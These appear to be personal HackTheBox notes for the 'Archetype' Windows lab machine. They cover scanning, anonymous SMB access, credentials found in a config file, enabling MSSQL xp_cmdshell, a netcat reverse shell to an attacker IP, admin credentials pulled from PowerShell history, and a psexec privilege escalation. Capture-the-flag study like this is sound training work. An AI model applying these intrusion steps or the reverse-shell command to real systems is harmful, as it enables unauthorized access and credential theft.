#HackTheBox #linux 
# Machine Windows

# 1- Scan 
## Nmap
PORT      STATE SERVICE      VERSION
[135/tcp]   open  msrpc        Microsoft Windows RPC
[139/tcp]   open  netbios-ssn  Microsoft Windows netbios-ssn
[445/tcp]   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
[1433/tcp]  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
|_ssl-date: 2023-03-17T23:29:41+00:00; +9s from scanner time.
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-03-17T23:23:54
| Not valid after:  2053-03-17T23:23:54
| MD5:   ccef1fe9d0c4440fe5d4157cace2222e
|_SHA-1: a9f3c7fff0a5b62e88081b45f474d625df8db71b
[5985/tcp]  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
[47001/tcp] open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC

Host script results:
|_clock-skew: mean: 1h45m08s, deviation: 3h30m00s, median: 8s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-03-17T23:29:30
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-03-17T16:29:29-07:00

# Pistes
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
Protocole SMB utilisé

# 2. Connexion smb
┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# smbclient -N -L \\\\htb   
```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backups         Disk      
C$              Disk      Default share
IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available`
```
	                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# smbclient -N \\\\htb\\backups

## smb shell got & prod.dtsConfig downloaded
	smb: \> ls
	  .                                   D        0  Mon Jan 20 07:20:57 2020
	  ..                                  D        0  Mon Jan 20 07:20:57 2020
	  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020
	smb: \> get prod.dtsConfig
	getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)

# Find
┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# cat prod.dtsConfig                                                             
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>

# 3. Connexion mssql
┌──(root㉿kali)-[/home/…/Desktop/tools/impacket/examples] 
└─# python3.11 mssqlclient.py ARCHETYPE/sql_svc@htb -windows-auth
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
Password: M3g4c0rp123

SQL (ARCHETYPE\sql_svc  dbo@master)> sp_configure 'xp_cmdshell', 1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.

# Exploitation 
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC sp_configure 'show advanced options', 1; RECONFIGURE; sp_configure; - Enabling the sp_configure as stated in the above error message EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;  #ExploitMssql 

## Revershell
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Documents; .\nc.exe -e cmd.exe 10.10.16.82 443"

# Foothold
## Find
[PS C:\Users\sql_svc\Documents>] cat  C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit

# PrivEsc
┌──(root㉿kali)-[/home/kali/Desktop]
└─# python3.11 psexe.py administrator@htb whoami